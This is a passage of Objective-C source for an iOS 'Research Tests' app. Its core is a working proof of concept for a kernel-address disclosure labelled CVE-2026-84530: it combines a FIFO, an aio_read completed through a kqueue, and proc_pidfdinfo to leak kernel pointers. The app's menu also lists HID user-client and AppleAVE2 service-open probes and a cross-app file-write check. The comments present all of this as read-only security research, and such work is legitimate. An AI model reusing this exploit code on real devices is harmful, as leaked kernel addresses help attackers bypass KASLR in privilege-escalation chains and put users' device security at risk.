    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0), ^{
        NSString *result = [self runDisclosure];
        dispatch_async(dispatch_get_main_queue(), ^{
            self.logView.text = result;
            // Intentionally one-shot per page visit.
        });
    });
}
- (NSString *)runDisclosure {
    NSMutableString *log = [NSMutableString stringWithFormat:
       @"AIO metadata read-only test\nOS %@\n", UIDevice.currentDevice.systemVersion];
    ProbePidFdInfo info = (ProbePidFdInfo)dlsym(RTLD_DEFAULT,"proc_pidfdinfo");
    if (!info) return [log stringByAppendingString:@"UNAVAILABLE: proc_pidfdinfo is not exported."];
    int kq = kqueue();
    if (kq < 0) return [log stringByAppendingFormat:@"kqueue error: %d",errno];
    NSString *name = [NSString stringWithFormat:@"aio-%@.fifo",NSUUID.UUID.UUIDString];
    NSString *file = [NSTemporaryDirectory() stringByAppendingPathComponent:name];
    const char *path = file.fileSystemRepresentation;
    int fd = -1, writer = -1, err = 0;
    struct aiocb *cb = NULL;
    if (mkfifo(path,0600) != 0) {
        [log appendFormat:@"mkfifo errno=%d",errno];
        goto cleanup;
    }
    fd = open(path,O_RDONLY | O_NONBLOCK);
    if (fd < 0) { [log appendFormat:@"FIFO read open errno=%d",errno]; goto cleanup; }
    writer = open(path,O_WRONLY | O_NONBLOCK);
    if (writer < 0) { [log appendFormat:@"FIFO write open errno=%d",errno]; goto cleanup; }
    int flags = fcntl(fd,F_GETFL);
    if (flags >= 0) fcntl(fd,F_SETFL,flags & ~O_NONBLOCK);
    cb = calloc(1,sizeof(*cb));
    if (!cb) { [log appendString:@"No memory for AIO control block"]; goto cleanup; }
    void *buf = calloc(1,32);
    if (!buf) { [log appendString:@"No memory for AIO buffer"]; goto cleanup; }
    cb->aio_fildes=fd;
    cb->aio_buf=buf;
    cb->aio_nbytes=32;
    cb->aio_sigevent.sigev_notify=SIGEV_KEVENT;
    cb->aio_sigevent.sigev_signo=kq;
    if (aio_read(cb) != 0) {
        err = errno;
        [log appendFormat:@"aio_read unavailable, errno=%d",err];
        free(buf); free(cb); cb=NULL;
        goto cleanup;
    }
    BOOL found = NO;
    for (int attempt=0; attempt<12 && !found; attempt++) {
        struct ProbeAIOExtInfo records[16] = {0};
        errno=0;
        int amount = info(getpid(),kq,9,records,(int)sizeof(records));
        if (amount < 0) {
            [log appendFormat:@"proc_pidfdinfo denied/failed errno=%d",errno];
            break;
        }
        NSUInteger count = MIN((NSUInteger)16,
            (NSUInteger)(amount > 16 ? amount/sizeof(records[0]) : amount));
        for (NSUInteger i=0; i<count; i++) {
            uint64_t value = records[i].savedData;
            if (records[i].event.filter == EVFILT_AIO &&
                value >= 0xffff000000000000ULL) {
                [log appendFormat:@"PASS: AIO saved-data kernel address 0x%016llx; event data=%lld\n",
                    (unsigned long long)value,(long long)records[i].event.data];
                found=YES;
                break;
            }
        }
        if (!found) usleep(20000);
    }
    if (!found) [log appendString:@"NOT VERIFIED: No kernel-looking AIO saved-data returned.\n"];
    // Complete only this application's own pending FIFO operation.
    uint8_t payload[32] = {0};
    (void)write(writer,payload,sizeof(payload));
    for (int tries=0;tries<50;tries++) {
        int state=aio_error(cb);
        if (state!=EINPROGRESS) break;
        usleep(10000);
    }
    int state=aio_error(cb);
    if (state!=EINPROGRESS) {
        (void)aio_return(cb);
        free(buf); free(cb); cb=NULL;
    } else {
        [log appendString:@"AIO still pending; retaining control block until process exit.\n"];
    }
cleanup:
    if (fd>=0) close(fd);
    if (writer>=0) close(writer);
    close(kq);
    unlink(path);
    return log;
}
@end

@interface ProbeHomeController : UITableViewController
@end
@implementation ProbeHomeController
- (instancetype)init {
    self = [super initWithStyle:UITableViewStyleInsetGrouped];
    return self;
}
- (void)viewDidLoad {
    [super viewDidLoad];
    self.title = @"Research Tests";
    self.tableView.rowHeight = UITableViewAutomaticDimension;
    self.tableView.estimatedRowHeight = 60;
}
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
    return 4;
}
- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section {
    return @[@"App data", @"HID / IOHIDFamily", @"Kernel services", @"Kernel information leaks"][section];
}
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return section == 0 ? 1 : (section == 1 ? 4 : 1);
}
- (NSString *)nameAt:(NSIndexPath *)indexPath {
    if (indexPath.section == 0) return @"Erosion file-change validation";
    if (indexPath.section == 2) return @"AppleAVE2 and service opens";
    if (indexPath.section == 3) return @"AIO kqueue CVE-2026-84530";
    return @[@"HID service reachability",
             @"HID provider inventory",
             @"HID manager class opens",
             @"AOPTouch FastPath type 2"][indexPath.row];
}
- (NSString *)noteAt:(NSIndexPath *)indexPath {
    if (indexPath.section == 0) return @"Existing cross-app data-file write validation";
    if (indexPath.section == 2) return @"One-time service access checks";
    if (indexPath.section == 3) return @"Actual kernel-address disclosure, read-only";
    return @[@"Registered services; manager connection",
             @"Registry only — no connection opens",
             @"Standard HID manager client opens",
             @"User-client type 2 open only — no exploit"][indexPath.row];
}
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:@"ResearchTest"];
    if (!cell) cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle
                                             reuseIdentifier:@"ResearchTest"];
    cell.textLabel.text = [self nameAt:indexPath];
    cell.detailTextLabel.text = [self noteAt:indexPath];
    cell.detailTextLabel.numberOfLines = 0;
    cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;
    return cell;
}
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {
    [tableView deselectRowAtIndexPath:indexPath animated:YES];
    UIViewController *page;
    if (indexPath.section == 0) {
        page = [ContainerChangeController new];
    } else if (indexPath.section == 2) {
        page = [ProbeController new];
    } else if (indexPath.section == 3) {
        page = [AIODisclosureController new];
    } else {
        page = [[HIDReachabilityController alloc] initWithTestMode:(HIDTestMode)indexPath.row];
    }
    [self.navigationController pushViewController:page animated:YES];
}
- (NSString *)tableView:(UITableView *)tableView titleForFooterInSection:(NSInteger)section {
    if (section == 0)
        return @"An Erosion write to the probe's own Documents file was already verified. This page does not grant cross-app access itself.";
    if (section == 1)
        return @"These are historical research checks, not kernel memory access. No tests run automatically.";
    if (section == 2) return @"Do not repeat completed access checks without a new question to test.";
    return @"CVE-2026-84530 is a kernel-address leak, not arbitrary memory access or code execution. No stress loops.";
}
@end

@interface ProbeAppDelegate : UIResponder <UIApplicationDelegate>
@property(nonatomic,strong) UIWindow *window;
@end
@implementation ProbeAppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    self.window.rootViewController = [[UINavigationController alloc] initWithRootViewController:[ProbeHomeController new]];
    [self.window makeKeyAndVisible];
    return YES;
}
@end
int main(int argc, char **argv) {
    @autoreleasepool { return UIApplicationMain(argc, argv, nil, NSStringFromClass([ProbeAppDelegate class])); }
}
